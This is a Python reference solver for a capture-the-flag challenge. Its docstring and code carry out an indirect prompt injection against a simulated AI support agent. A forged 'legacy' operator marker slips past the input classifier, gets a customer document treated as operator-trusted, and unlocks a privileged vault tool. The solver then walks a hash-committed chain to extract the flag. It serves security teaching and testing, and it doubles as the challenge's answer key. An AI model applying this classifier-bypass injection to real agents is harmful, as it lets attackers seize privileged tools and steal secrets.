#!/usr/bin/env python3
"""
ZSCTF :: Confidant -- reference solver (indirect prompt injection + vault walk).

This solver is GENERIC: it works against ANY per-instance seed because it does
not hard-code the payload. It reads the instance's own published guardrail
POLICY and *reasons* to the exploit, exactly as the intended human/agent path:

  1. The privileged tool (`get_secret`/`read_vault`/...) is reachable only with
     'operator' provenance. A DIRECT request (chat, or the plain customer body
     of a document) is refused by the allowlist -- that is the decoy path.

  2. A document's trust boundary is decided by an operator marker that lives
     INSIDE the (customer-supplied) document. So customer content can promote
     itself to 'operator'. That is the indirect-injection flaw.

  3. The INPUT CLASSIFIER hard-blocks any upload carrying an *official* operator
     marker -- so forging the region with the official marker fails. But the
     INGESTION PARSER also honours a *legacy* marker that the classifier was
     never taught (a parser/classifier differential). Using the legacy marker
     opens the trusted region invisibly to the classifier.

  4. Craft:  <benign customer line>\\n<legacy marker>\\n<privileged directive>
     -- no manipulation language, so the classifier's weighted score stays well
     under threshold. The parser tags the directive 'operator'; the allowlist
     authorises the privileged tool.

SOLVING THE CRUX EARNS ONLY THE MEANS TO EXTRACT (S2/S2a layer):
  5. The privileged tool does not return the flag. With operator provenance it
     opens a sealed-ledger INDEX listing candidate head tokens and a
     head_commitment = sha256(real_head).
  6. Select the REAL head = the candidate whose sha256 matches the commitment
     (discriminator #1); the others are decoy heads whose chains reconstruct to
     near-flags that fail ^zerosecurectf\\{[a-z0-9_]{8,48}\\}$ (discriminator #2).
  7. Walk the chain: each operator-authorised `<verb> <token>` returns ONE
     hex-encoded fragment and the NEXT token. Concatenate fragments in page
     order to recover the whole flag. The flag is never emitted whole, and the
     page tokens are seed-derived so they cannot be enumerated offline.

Run locally against the source:   python3 solve.py --local ../challenge/server.py
Run against a deployed instance:  python3 solve.py --remote HOST PORT
"""
import sys, re, json, base64, socket, hashlib, subprocess, argparse

STRICT = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


# -- transport abstractions (mirror the house style) -------------------------
class Proc:
    def __init__(self, path):
        self.p = subprocess.Popen([sys.executable, path], stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, text=True, bufsize=1)

    def readline(self):
        return self.p.stdout.readline()

    def send(self, line):
        self.p.stdin.write(line + "\n"); self.p.stdin.flush()

    def close(self):
        try:
            self.send("QUIT")
        except Exception:
            pass
        try:
            self.p.wait(timeout=5)
        except Exception:
            self.p.kill()


class Sock:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.f = self.s.makefile("rw", newline="\n")

    def readline(self):
        return self.f.readline()

    def send(self, line):
        self.f.write(line + "\n"); self.f.flush()

    def close(self):
        try:
            self.send("QUIT")
        except Exception:
            pass
        self.s.close()


def read_block(io):
    """Read lines until a lone '[end]' terminator; return the lines before it."""
    lines = []
    while True:
        ln = io.readline()
        if not ln:
            raise RuntimeError("service closed unexpectedly")
        ln = ln.rstrip("\n")
        if ln == "[end]":
            return lines
        lines.append(ln)


def get_policy(io):
    read_block(io)                       # consume the banner
    io.send("POLICY")
    for ln in read_block(io):
        ln = ln.strip()
        if ln.startswith("{"):
            return json.loads(ln)
    raise RuntimeError("no POLICY JSON returned")


def craft_document(pol):
    """Reason from the published policy to a defence-robust injection document."""
    # the privileged tool and its directive verb
    secret = next(t for t in pol["tools"] if t["privileged"])
    verb = secret["verb"]

    # the parser trusts markers the classifier does not hard-block -> the gap
    hard = set(pol["input_classifier"]["hard_block_markers"])
    parser_markers = pol["ingestion_parser"]["operator_region_markers"]
    legacy = [m for m in parser_markers if m not in hard]
    if not legacy:
        raise RuntimeError("no classifier/parser differential found for this instance")
    legacy_marker = legacy[0]

    # a benign customer body with no 'risky nouns' and no manipulation language,
    # so the classifier's weighted score stays under threshold.
    document = "Hello, I need help with my order.\n%s\n%s 1\n" % (legacy_marker, verb)
    return document, verb, legacy_marker


def solve(io):
    pol = get_policy(io)
    _, verb, marker = craft_document(pol)
    transcript = []
    def request(directive):
        doc = "Hello, I need help with my order.\n" + marker + "\n" + directive + "\n"
        io.send("DOC " + base64.b64encode(doc.encode()).decode())
        lines = read_block(io)
        transcript.extend(lines)
        return lines
    lines = request(pol["vault"]["open_index_with"])
    commitment = next(re.search(r"head_commitment=([0-9a-f]+)", x).group(1)
                      for x in lines if "head_commitment=" in x)
    heads = next(x.split("candidate_heads=", 1)[1].split(",")
                 for x in lines if "candidate_heads=" in x)
    head = next(t for t in heads if hashlib.sha256(t.encode()).hexdigest() == commitment)
    chunks = []
    seen = set()
    while head != "END":
        if head in seen:
            raise RuntimeError("cycle in vault chain")
        seen.add(head)
        lines = request(verb + " " + head)
        match = next((re.search(r"frag=([0-9a-f]+) next=(\S+)", x) for x in lines
                      if "frag=" in x), None)
        if not match:
            raise RuntimeError("sealed page not returned")
        chunks.append(bytes.fromhex(match.group(1)))
        head = match.group(2)
    flag = b"".join(chunks).decode()
    if not STRICT.fullmatch(flag):
        raise RuntimeError("vault chain produced a malformed answer")
    return transcript, flag


def main():
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="SERVER_PY")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    args = ap.parse_args()
    io = Proc(args.local) if args.local else Sock(args.remote[0], int(args.remote[1]))
    try:
        transcript, flag = solve(io)
        print("[+] agent transcript:")
        for ln in transcript:
            print("        " + ln)
        if flag:
            print("[+] FLAG =", flag)
            return 0
        print("[-] no flag returned (the privileged tool was not reached)")
        return 1
    finally:
        io.close()


if __name__ == "__main__":
    sys.exit(main())
